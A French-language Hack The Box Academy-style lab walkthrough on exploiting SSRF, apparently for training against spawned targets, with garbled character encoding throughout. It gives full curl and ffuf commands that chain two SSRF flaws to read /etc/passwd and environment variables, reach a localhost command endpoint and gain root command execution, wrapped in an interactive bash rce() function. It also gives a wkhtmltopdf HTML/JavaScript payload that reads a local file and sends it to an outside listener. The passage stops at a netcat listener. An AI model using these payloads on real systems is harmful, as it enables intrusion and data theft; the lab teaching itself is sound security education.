Exemple d'exploitation SSRF
===========================

* * * * *

Exploitons d'abord une application Web accessible sur Internet (la cible peut Ãªtre gÃ©nÃ©rÃ©e au bas de cette section), puis travaillons pour obtenir l'exÃ©cution de code Ã  distance sur un hÃ´te interne en enchaÃ®nant plusieurs vulnÃ©rabilitÃ©s SSRF.Â Le flux d'attaque sera le suivantÂ :

| `[PENTESTER]` | `ğŸ –` | `[EXERCISE-TARGET]--[SSRF]` | `ğŸ –` | `[INTERNAL-WEBSERVER]--[SSRF]` | `ğŸ –` | `[LOCALHOST WEBAPP]` | `ğŸ –` | `[RCE]` |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |

AccÃ©dez Ã  la fin de cette section et cliquez surÂ `Click here to spawn the target system!`, puis utilisez la Pwnbox fournie ou une machine virtuelle locale avec la clÃ© VPN fournie pour suivre.

Une reconnaissance de base contre l'hÃ´te montre qu'il n'y a que deux ports ouverts.

#### Nmap - DÃ©couvrir les ports ouverts

Â Â Nmap - DÃ©couvrir les ports ouverts

```
dsgsec@htb[/htb]$ nmap -sT -T5 --min-rate=10000 -p- <TARGET IP>

Nmap scan report for <TARGET IP>
Host is up (0.00047s latency).
Not shown: 65532 filtered ports
PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  open   http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 13.25 seconds

```

Envoyons une requÃªte cURL au serveur cible en utilisant les paramÃ¨tresÂ `-i`pour afficher les en-tÃªtes de rÃ©ponse du protocole etÂ `-s`pour utiliser le mode silencieux.

#### Curl - Interagir avec la cible

Â Â Curl - Interagir avec la cible

```
dsgsec@htb[/htb]$ curl -i -s http://<TARGET IP>

HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 242
Location: http://<TARGET IP>/load?q=index.html
Server: Werkzeug/2.0.2 Python
Date: Mon, 18 Oct 2021 09:01:02 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/load?q=index.html">/load?q=index.html</a>. If not click the link.

```

Nous pouvons voir la requÃªte redirigÃ©e versÂ `/load?q=index.html`, ce qui signifie que leÂ `q`paramÃ¨tre rÃ©cupÃ¨re la ressourceÂ `index.html`.Â Suivons la redirection pour voir si nous pouvons recueillir des informations supplÃ©mentaires.

Â Â Curl - Interagir avec la cible

```

dsgsec@htb[/htb]$ curl -i -s -L http://<TARGET IP>

HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 242
Location: http://<TARGET IP>/load?q=index.html
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Mon, 18 Oct 2021 10:20:27 GMT

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 153
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Mon, 18 Oct 2021 10:20:27 GMT

<html>
<!-- ubuntu-web.lalaguna.local & internal.app.local load resources via q parameter -->
<body>
<h1>Bad App</h1>
<a>Hello World!</a>
</body>
</html>

```

La cible gÃ©nÃ©rÃ©e estÂ `ubuntu-web.lalaguna.local`, etÂ `internal.app.local`est une application sur le rÃ©seau interne (inaccessible depuis notre position actuelle).

L'Ã©tape suivante consiste Ã  confirmer si leÂ `q`paramÃ¨tre est vulnÃ©rable Ã  SSRF.Â Si c'est le cas, nous pourrons peut-Ãªtre accÃ©der Ã  l'application Web internal.app.local en exploitant la vulnÃ©rabilitÃ© SSRF.Â Nous disons "peut" car une relation de confiance existe probablement pourÂ `ubuntu-web`pouvoir atteindre et interagir avecÂ `internal.app.local`.Â Ce type de relation peut Ãªtre quelque chose d'aussi simple qu'une rÃ¨gle de pare-feu (ou mÃªme une absence de rÃ¨gle de pare-feu).

Dans un terminal, utilisons Netcat pour Ã©couter sur le port 8080, comme suit.

#### Ã‰couteur Netcat

Â Â Ã‰couteur Netcat

```
dsgsec@htb[/htb]$ nc -nvlp 8080

listening on [any] 8080 ...

```

Maintenant, envoyons une requÃªte Ã  l'application Web cible avecÂ `http://<VPN/TUN Adapter IP>`plutÃ´t queÂ `index.html`dans un autre terminal, comme suit.Â `<VPN/TUN Adapter IP>`sera soit l'adresse IP de l'adaptateur TUN de Pwnbox, soit l'adresse IP de l'adaptateur TUN de la machine virtuelle locale que vous utilisez (aprÃ¨s vous Ãªtre connectÃ© avec la clÃ© VPN fournie).

#### Curl - Test pour SSRF

Â Â Curl - Test pour SSRF

```
dsgsec@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:8080"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 0
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Mon, 18 Oct 2021 12:07:10 GMT

```

Nous recevrons ce qui suit dans notre Ã©couteur Netcat confirmant la vulnÃ©rabilitÃ© SSRF via une requÃªte Ã©mise par le serveur cible Ã  l'aide deÂ [Python-urllib](https://docs.python.org/3.8/library/urllib.html)Â :

#### Netcat Listener - Confirmation de SSRF

Â Â Netcat Listener - Confirmation de SSRF

```
Connection received on <TARGET IP> 49852
GET / HTTP/1.1
Accept-Encoding: identity
Host: <VPN/TUN Adapter IP>:8080
User-Agent: Python-urllib/3.8
Connection: close

```

En lisant laÂ documentationÂ [Python-urllib](https://docs.python.org/3.8/library/urllib.html)`file`Â , nous pouvons voir qu'il prend en charge ,Â `http`etÂ `ftp`les schÃ©mas.Â Ainsi, en plus d'Ã©mettre des requÃªtes HTTP Ã  d'autres services au nom de l'application cible, nous pouvons Ã©galement lire des fichiers locaux via leÂ `file`schÃ©ma et des fichiers distants Ã  l'aide deÂ `ftp`.

Nous pouvons tester cette fonctionnalitÃ© en suivant les Ã©tapes ci-dessousÂ :

1.  CrÃ©ez un fichier appelÃ© index.html

Code :Â html

```
<html>
</body>
<a>SSRF</a>
<body>
<html>

```

1.  Dans le rÃ©pertoire oÃ¹ se trouve index.html, dÃ©marrez un serveur HTTP Ã  l'aide de la commande suivante

#### DÃ©marrer le serveur HTTP Python

Â Â DÃ©marrer le serveur HTTP Python

```
dsgsec@htb[/htb]$ python3 -m http.server 9090

```

1.  Dans le rÃ©pertoire oÃ¹ se trouve index.html, dÃ©marrez un serveur FTP via la commande suivante

#### DÃ©marrer le serveur FTP

Â Â DÃ©marrer le serveur FTP

```
dsgsec@htb[/htb]$ sudo pip3 install twisted
dsgsec@htb[/htb]$ sudo python3 -m twisted ftp -p 21 -r .

```

1.  RÃ©cupÃ©rez index.html via l'application cible Ã  l'aide duÂ `ftp`schÃ©ma, comme suit

#### RÃ©cupÃ©ration d'un fichier distant via l'application cible - SchÃ©ma FTP

Â Â RÃ©cupÃ©ration d'un fichier distant via l'application cible - SchÃ©ma FTP

```
dsgsec@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=ftp://<VPN/TUN Adapter IP>/index.html"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 41
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 11:21:09 GMT

<html>
</body>
<a>SSRF</a>
<body>
<html>

```

1.  RÃ©cupÃ©rez index.html via l'application cible Ã  l'aide duÂ `http`schÃ©ma, comme suit

#### RÃ©cupÃ©ration d'un fichier distant via l'application cible - SchÃ©ma HTTP

Â Â RÃ©cupÃ©ration d'un fichier distant via l'application cible - SchÃ©ma HTTP

```
dsgsec@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:9090/index.html"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 41
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 11:26:18 GMT

<html>
</body>
<a>SSRF</a>
<body>
<html>

```

1.  RÃ©cupÃ©rez un fichier local Ã  l'aide du schÃ©ma de fichier, comme suit

#### RÃ©cupÃ©ration d'un fichier local via l'application cible - SchÃ©ma de fichier

Â Â RÃ©cupÃ©ration d'un fichier local via l'application cible - SchÃ©ma de fichier

```
dsgsec@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=file:///etc/passwd"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 926
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 11:27:17 GMT

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

```

Gardez Ã  l'esprit que la rÃ©cupÃ©ration de fichiers HTML distants peut conduire Ã  un XSS rÃ©flÃ©chi.

N'oubliez pas que nous n'avons que deux ports ouverts sur le serveur cible.Â Cependant, il est possible que des applications internes existent et n'Ã©coutent que sur localhost.Â Nous pouvons utiliser un outil tel que ffuf pour Ã©numÃ©rer ces applications Web en effectuant les Ã©tapes suivantes :

1.  GÃ©nÃ©rez une liste de mots contenant tous les ports possibles.

#### GÃ©nÃ©rer une liste de mots

Â Â GÃ©nÃ©rer une liste de mots

```
dsgsec@htb[/htb]$ for port in {1..65535};do echo $port >> ports.txt;done

```

1.  Envoyez une requÃªte cURL Ã  un port alÃ©atoire pour obtenir la taille de rÃ©ponse d'une requÃªte pour un service inexistant.

#### Curl - Interagir avec la cible

Â Â Curl - Interagir avec la cible

```
dsgsec@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:1"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 30
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 11:36:25 GMT

[Errno 111] Connection refused

```

1.  Utilisez ffuf avec la liste de mots et jetez les rÃ©ponses qui ont la taille que nous avons prÃ©cÃ©demment identifiÃ©e.

#### Fuzzing de ports

Â Â Fuzzing de ports

```
dsgsec@htb[/htb]$ ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs 30

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://<TARGET IP>/load?q=http://127.0.0.1:PORT
 :: Wordlist         : PORT: ./ports.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 30
________________________________________________

80                      [Status: 200, Size: 153, Words: 11, Lines: 8]
5000                    [Status: 200, Size: 64, Words: 3, Lines: 1]
:: Progress: [65535/65535] :: Job [1/1] :: 577 req/sec :: Duration: [0:02:00] :: Errors: 0 ::

```

Nous avons reÃ§u une rÃ©ponse valide pour le portÂ `5000`.Â VÃ©rifions-le comme suit.

#### cURL - Interagir avec la cible

Â Â cURL - Interagir avec la cible

```
dsgsec@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:5000"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 64
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 11:47:16 GMT

<html><body><h1>Hey!</h1><a>Some internal app!</a></body></html>

```

Jusqu'Ã  prÃ©sent, nous avons appris Ã  accÃ©der aux applications internes et Ã  utiliser diffÃ©rents schÃ©mas pour charger des fichiers locaux via SSRF.Â Forts de ces connaissances, essayons d'attaquer l'Â `internal.app.local`application Web, toujours via SSRF.Â Notre objectif ultime est de rÃ©aliser l'exÃ©cution de code Ã  distance sur un hÃ´te interne.

Tout d'abord, nous envoyons une simple requÃªte cURL Ã  l'application interne que nous avons dÃ©couverte prÃ©cÃ©demment.Â Rappelez-vous les informations que nous avons dÃ©couvertes selon lesquelles les deux applications chargent les ressources de la mÃªme maniÃ¨re (via leÂ `q`paramÃ¨tre).

#### cURL - Interagir avec la cible

Â Â cURL - Interagir avec la cible

```
dsgsec@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=index.html"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 83
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 13:51:15 GMT

<html>
<body>
<h1>Internal Web Application</h1>
<a>Hello World!</a>
</body>
</html>

```

DÃ©couvrons maintenant toutes les applications web Ã©coutant en localhost.Â Essayons d'Ã©mettre une requÃªte vers un port alÃ©atoire pour identifier Ã  quoi ressemblent les rÃ©ponses des ports fermÃ©s.

#### cURL - Interagir avec la cible

Â Â cURL - Interagir avec la cible

```
dsgsec@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http://127.0.0.1:1"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 97
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 14:52:32 GMT

<html><body><h1>Resource: http127.0.0.1:1</h1><a>unknown url type: http127.0.0.1</a></body></html>

```

Nous avons reÃ§u unÂ `unknown url type`message d'erreur.Â Il semble que l'application Web soit supprimÃ©eÂ `://`de notre demande.Â Essayons de surmonter cette situation en modifiant l'URL.

#### cURL - Interagir avec la cible

Â Â cURL - Interagir avec la cible

```
dsgsec@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 99
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 14:55:10 GMT

<html><body><h1>Resource: http://127.0.0.1:1</h1><a>[Errno 111] Connection refused</a></body></html>

```

Dans ce cas, l'application Web renvoie du contenu rendu HTML contenant la ressource que nous essayons de rÃ©cupÃ©rer.Â Cette rÃ©ponse affectera notre dÃ©couverte de service interne si nous utilisons la taille de la rÃ©ponse comme filtre car elle changera en fonction du port.Â Heureusement pour nous, ffuf prend en charge les expressions rÃ©guliÃ¨res pour le filtrage.Â Nous pouvons utiliser cette fonction ffuf pour utiliser le numÃ©ro d'erreur pour filtrer les rÃ©ponses, comme suit.

#### Fuzzing de ports

Â Â Fuzzing de ports

```
dsgsec@htb[/htb]$ ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT" -fr 'Errno[[:blank:]]111'

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT
 :: Wordlist         : PORT: ./ports.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Regexp: Errno[[:blank:]]111
________________________________________________

80                      [Status: 200, Size: 153, Words: 5, Lines: 6]
5000                    [Status: 200, Size: 123, Words: 3, Lines: 5]
:: Progress: [65535/65535] :: Job [1/1] :: 249 req/sec :: Duration: [0:04:06] :: Errors: 0 ::

```

Nous avons trouvÃ© une autre application en Ã©coute sur le port 5000. Dans ce cas, l'application rÃ©pond par une liste de fichiers.

#### cURL - Interagir avec la cible

Â Â cURL - Interagir avec la cible

```
dsgsec@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 385
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 20:30:07 GMT

<html><body><h1>Resource: http://127.0.0.1:5000/</h1><a>total 24K
drwxr-xr-x 1 root root 4.0K Oct 19 20:29 .
drwxr-xr-x 1 root root 4.0K Oct 19 20:29 ..
-rw-r--r-- 1 root root   84 Oct 19 16:32 index.html
-rw-r--r-- 1 root root 1.2K Oct 19 16:32 internal.py
-rw-r--r-- 1 root root  691 Oct 19 20:29 internal_local.py
-rwxr-xr-x 1 root root   69 Oct 19 16:32 start.sh
 </a></body></html>

```

Faisons un bref rÃ©capitulatif de ce que nous avons accompliÂ :

-   Ã‰mettre des demandes au nom d'ubuntu-web Ã  internal.app.local
-   Atteindre une application Web Ã©coutant sur le port 5000 Ã  l'intÃ©rieur de internal.app.local enchaÃ®nant deux vulnÃ©rabilitÃ©s SSRF
-   Divulguer une liste de fichiers via l'application interne

DÃ©couvrons maintenant le code source des applications Web Ã  l'Ã©couteÂ `internal.app.local`pour voir comment nous pouvons rÃ©aliser l'exÃ©cution de code Ã  distance.

Ã‰mettons une demande de divulgationÂ `/proc/self/environ`de fichier, oÃ¹ le chemin actuel doit Ãªtre prÃ©sent sous laÂ `PWD`variable d'environnement.

#### cURL - Interagir avec la cible

Â Â cURL - Interagir avec la cible

```
dsgsec@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 584
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 16:52:20 GMT

<html><body><h1>Resource: file:///proc/self/environ</h1><a>HOSTNAME=18f236843662PYTHON_VERSION=3.8.12PWD=/appPORT=80PYTHON_SETUPTOOLS_VERSION=57.5.0HOME=/rootLANG=C.UTF-8GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568SHLVL=0PYTHON_PIP_VERSION=21.2.4PYTHON_GET_PIP_SHA256=01249aa3e58ffb3e1686b7141b4e9aac4d398ef4ac3012ed9dff8dd9f685ffe0PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/d781367b97acf0ece7e9e304bf281e99b618bf10/public/get-pip.pyPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin_=/usr/local/bin/python3</a></body></html>

```

Nous savons maintenant que le chemin actuel estÂ `/app`, et nous avons une liste de fichiers intÃ©ressants.Â Divulguons leÂ `internal_local.py`fichier comme suit.

#### RÃ©cupÃ©ration d'un fichier local via l'application cible - SchÃ©ma de fichier

Â Â RÃ©cupÃ©ration d'un fichier local via l'application cible - SchÃ©ma de fichier

```
dsgsec@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 771
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 20:40:28 GMT

<html><body><h1>Resource: file:///app/internal_local.py</h1><a>import os
from flask import *
import urllib
import subprocess

basedir = os.path.abspath(os.path.dirname(__file__))

app = Flask(__name__)

def run_command(command):
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout = p.stdout.read()
    stderr = p.stderr.read()
    result = stdout.decode() + " " + stderr.decode()
    return result

@app.route("/")
def index():
    return run_command("ls -lha")

@app.route("/runme")
def runmewithargs():
    command = request.args.get("x")
    if command == "":
        return "Use /runme?x=<CMD>"
    return run_command(command)

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000)
</a></body></html>

```

En Ã©tudiant le code source ci-dessus, nous remarquons une fonctionnalitÃ© qui nous permet d'exÃ©cuter des commandes sur l'hÃ´te distant en envoyant une requÃªte GET Ã Â `/runme?x=<CMD>`.Â Confirmons l'exÃ©cution du code Ã  distance en envoyantÂ `whoami`une commande.

#### cURL - Interagir avec la cible

Â Â cURL - Interagir avec la cible

```
dsgsec@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 93
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 20:48:32 GMT

<html><body><h1>Resource: http://127.0.0.1:5000/runme?x=whoami</h1><a>root
 </a></body></html>

```

Nous pouvons exÃ©cuter des commandes dans le contexte de superutilisateur sur l'application cible.Â Mais que se passe-t-il si nous essayons de soumettre une commande avec des arguments, comme ci-dessousÂ ?

Â Â cURL - Interagir avec la cible

```

dsgsec@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a"

HTTP/1.0 400 Bad request syntax ('GET /load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a HTTP/1.1')
Connection: close
Content-Type: text/html;charset=utf-8
Content-Length: 586

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 400</p>
        <p>Message: Bad request syntax ('GET /load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a HTTP/1.1').</p>
        <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
    </body>
</html>

```

Pour exÃ©cuter des commandes avec des arguments ou des caractÃ¨res spÃ©ciaux, nous devons les encoder trois fois au fur et Ã  mesure que nous les passons Ã  travers trois applications Web diffÃ©rentes.

Pour ce faire, vous pouvez utiliser n'importe quel service d'encodage d'URL en ligne tel queÂ [urlencoder.org](https://www.urlencoder.org/)Â .Â Un moyen rapide d'y parvenir depuis le terminal existe Ã©galement.Â Il s'agit d'utiliserÂ `jq`, qui prend en charge l'encodage comme suitÂ :

#### Installer JQ

Â Â Installer JQ

```
dsgsec@htb[/htb]$ sudo apt-get install jq
dsgsec@htb[/htb]$ echo "encode me" | jq -sRr @uri
encode%20me%0A

```

Nous pouvons maintenant crÃ©er une fonction bash pour automatiser l'exÃ©cution des commandes sur l'application cible.

#### Automatiser l'exÃ©cution des commandes

Â Â Automatiser l'exÃ©cution des commandes

```
dsgsec@htb[/htb]$ function rce() {
function> while true; do
function while> echo -n "# "; read cmd
function while> ecmd=$(echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
function while> curl -s -o - "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
function while> echo ""
function while> done
function> }

```

Maintenant, nous devons appeler la fonction et exÃ©cuter les commandes via :

Â Â Automatiser l'exÃ©cution des commandes

```
dsgsec@htb[/htb]$ rce
# uname -a; hostname; whoami

<html><body><h1>Resource: http://127.0.0.1:5000/runme?x=uname%20-a%3B%20hostname%3B%20whoami
</h1><a>Linux a054d48cc0a4 5.8.0-63-generic #71-Ubuntu SMP Tue Jul 13 15:59:12 UTC 2021 x86_64 GNU/Linux
a054d48cc0a4
root
 </a></body></html>
```Exemple d'exploitation SSRF en aveugle
======================================

* * * * *

Maintenant, exploitons une vulnÃ©rabilitÃ© SSRF aveugle dans une application Web qui reÃ§oit un fichier HTML et renvoie un document PDF.Â Cette application Web est la cible que nous pouvons gÃ©nÃ©rer lors de l'exercice Ã  la fin de cette section.

AccÃ©dez Ã  la fin de cette section et cliquez surÂ `Click here to spawn the target system!`, puis utilisez la Pwnbox fournie ou une machine virtuelle locale avec la clÃ© VPN fournie pour parcourir l'application cible et suivez.Â L'application Ã©coute sur le port 8080.

![image](https://academy.hackthebox.com/storage/modules/145/img/blind1_.png)

Si nous tÃ©lÃ©chargeons divers fichiers HTML et inspectons les rÃ©ponses, nous remarquerons que l'application renvoie la mÃªme rÃ©ponse, quels que soient la structure et le contenu des fichiers soumis.Â De plus, nous ne pouvons observer aucune rÃ©ponse liÃ©e au traitement du fichier HTML soumis sur le front-end.Â Doit-on en conclure que l'application n'est pas vulnÃ©rable Ã  SSRF ?Â Bien sÃ»r que non!Â Nous devons Ãªtre minutieux lors des tests d'intrusion et rechercher les homologues aveugles des diffÃ©rentes classes de vulnÃ©rabilitÃ©.

![image](https://academy.hackthebox.com/storage/modules/145/img/response_blind1_.png)

CrÃ©ons un fichier HTML contenant un lien vers un service sous notre contrÃ´le pour tester si l'application est vulnÃ©rable Ã  une vulnÃ©rabilitÃ© SSRF aveugle.Â Ce service peut Ãªtre un serveur Web hÃ©bergÃ© sur une machine que nous possÃ©dons, Burp Collaborator, une URL Pingb.in, etc. Veuillez noter que les protocoles que nous pouvons utiliser lors de l'utilisation de techniques hors bande incluent HTTP, DNS, FTP, etc.

Code :Â html

```
<!DOCTYPE html>
<html>
<body>
	<a>Hello World!</a>
	<img src="http://<SERVICE IP>:PORT/x?=viaimgtag">
</body>
</html>

```

Par souci de simplicitÃ©, le service que nous utiliserons pour tester une vulnÃ©rabilitÃ© SSRF aveugle sera un simple Ã©couteur Netcat exÃ©cutÃ© dans Pwnbox ou une VM locale et Ã©coutant sur le port 9090. Si vous utilisez une VM locale, n'oubliez pas d'utiliser le ClÃ© VPN.Â Ainsi, sur le fichier HTML ci-dessus,Â `SERVICE IP`devrait Ãªtre leÂ `VPN/TUN IP`de Pwnbox ou votre VM locale, etÂ `PORT`devrait ÃªtreÂ `9090`.

#### Ã‰couteur Netcat

Â Â Ã‰couteur Netcat

```
dsgsec@htb[/htb]$ sudo nc -nlvp 9090

Listening on 0.0.0.0 9090

```

![image](https://academy.hackthebox.com/storage/modules/145/img/http_server__.png)

AprÃ¨s avoir soumis le fichier, nous recevrons un message de l'application Web dans le navigateur et une demande Ã  notre serveur rÃ©vÃ©lant l'application utilisÃ©e pour convertir le document HTML en PDF.

![image](https://academy.hackthebox.com/storage/modules/145/img/http_payload_.png)

![image](https://academy.hackthebox.com/storage/modules/145/img/blind2__.png)

En inspectant la requÃªte, on remarqueÂ `wkhtmltopdf`dans le User-Agent.Â Si nous parcouronsÂ [la page Web de tÃ©lÃ©chargement de wkhtmltopdf](https://wkhtmltopdf.org/downloads.html)Â , la dÃ©claration ci-dessous attire notre attentionÂ :

`Do not use wkhtmltopdf with any untrusted HTML -- be sure to sanitize any user-supplied HTML/JS; otherwise, it can lead to the complete takeover of the server it is running on! Please read the project status for the gory details.`

GÃ©nial, nous pouvons exÃ©cuter JavaScript dans wkhtmltopdf !Â Tirons parti de cette fonctionnalitÃ© pour lire un fichier local en crÃ©ant le document HTML suivant.

Code :Â html

```
<html>
    <body>
        <b>Exfiltration via Blind SSRF</b>
        <script>
        var readfile = new XMLHttpRequest(); // Read the local file
        var exfil = new XMLHttpRequest(); // Send the file to our server
        readfile.open("GET","file:///etc/passwd", true);
        readfile.send();
        readfile.onload = function() {
            if (readfile.readyState === 4) {
                var url = 'http://<SERVICE IP>:<PORT>/?data='+btoa(this.response);
                exfil.open("GET", url, true);
                exfil.send();
            }
        }
        readfile.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
     </body>
</html>

```

Dans ce cas, nous utilisons deux objetsÂ [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest)Â , un pour lire le fichier local et un autre pour l'envoyer Ã  notre serveur.Â De plus, nous utilisons laÂ `btoa`fonction pour envoyer les donnÃ©es encodÃ©es en Base64.

![image](https://academy.hackthebox.com/storage/modules/145/img/http_payload_2.png)

DÃ©marrons un serveur HTTP, soumettons le nouveau fichier HTML, attendons la rÃ©ponse et dÃ©codons son contenu une fois le fichier HTML traitÃ©, comme suit.

#### Ã‰couteur Netcat

Â Â Ã‰couteur Netcat

```
dsgsec@htb[/htb]$ sudo nc -nlvp 9090

Listening on 0.0.0.0 9090
